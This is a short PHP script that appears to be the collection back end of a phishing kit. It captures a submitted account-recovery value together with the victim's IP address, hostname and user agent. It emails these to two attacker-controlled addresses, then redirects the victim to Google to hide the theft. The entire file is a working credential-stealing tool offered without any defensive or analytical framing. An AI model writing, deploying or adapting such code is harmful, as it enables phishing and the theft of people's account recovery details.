<?php
if($_POST["verify"] != "" and $_POST["verify"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------PHONE ETC-----------------------\n";
$message .= "recovery            : ".$_POST['verify']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Unknown  --------------|\n";
$send = "evilcderinclogz@gmail.com,evilc0der@protonmail.com";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: https://www.google.com/");
}else{
header ("Location: index.php");
}

?>